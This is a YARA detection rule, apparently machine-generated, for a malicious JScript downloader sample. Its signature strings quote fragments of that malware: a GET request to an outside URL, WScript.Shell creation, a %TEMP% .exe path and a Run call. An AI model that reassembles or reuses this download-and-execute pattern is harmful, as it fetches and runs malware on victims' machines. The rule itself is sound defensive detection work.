rule sig_20160330_8d8369020bb8288fa4b9e56bfc72a5f6 {
  meta:
    description = "datamaliciousorder - file 20160330_8d8369020bb8288fa4b9e56bfc72a5f6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d34a2c67c7b1e4f8ca9fac449a445124d9c8f6899aa5223a84251cbacfdf21cb"

  strings:
    $s1  = "_QL[_V](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "function _X(_BN, _GL){_F = _F * 1; return _BN - _GL;};" fullword ascii
    $s3  = "var _L0 = function _H() {return WScript[_V0](\"WScript\"+\".Shell\");}(), _NB = 11;" fullword ascii
    $s4  = "if (_QL[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _C() {return _L0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1PasiSmk2LzI9cz.ex\" + \"e\";};" fullword ascii
    $s6  = "function _VU(){return _U + \"\";};" fullword ascii
    $s7  = "function _MF() {return ((_W == true) && (_W == _O1)) ? 1 : _F;};" fullword ascii
    $s8  = "function _Z(_PV){_L0[\"Run\"](_PV, _F, _F);};" fullword ascii
    $s9  = "var _MW = new this[\"Date\"]();" fullword ascii
    $s10 = "return _X(_L, _QP);" fullword ascii
    $s11 = "function _RV()" fullword ascii
    $s12 = " while (_HG){" fullword ascii
    $s13 = "function _FN(_FB) {var _TR = (1, 2, 3, 4, 5, _FB); return _TR;};" fullword ascii
    $s14 = "function _J(){return _V0;};" fullword ascii
    $s15 = "function _PL(){return 22;};" fullword ascii
    $s16 = "var _J0 = false;" fullword ascii
    $s17 = "_W = true; " fullword ascii
    $s18 = "_O1 = true; " fullword ascii
    $s19 = "var _O1 = false;" fullword ascii
    $s20 = "} catch(_JP){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}